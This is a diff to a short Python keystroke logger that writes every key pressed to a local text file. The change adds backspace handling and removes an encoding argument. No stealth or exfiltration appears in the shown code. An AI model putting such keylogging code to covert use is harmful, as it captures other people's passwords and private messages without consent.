@@ -12,13 +12,18 @@ with open("./file.txt", "a") as file:
 
 def on_press(key):
         try:
-            with open("./file.txt", "a", encoding="UTF-8") as output_file:
+            with open("./file.txt", "a") as output_file:
                 if key == keyboard.Key.space:
                     output_file.write(" ")
                 else:
                     output_file.write(key.char)
         except AttributeError:
-            if key == keyboard.Key.esc:
+            if key == keyboard.Key.backspace:
+                with open("./file.txt", "r") as output_file:
+                    data = output_file.read()
+                with open("./file.txt", "w") as output_file:
+                    output_file.write(data[:-1])
+            elif key == keyboard.Key.esc:
                 # Stop listener
                 return False
 
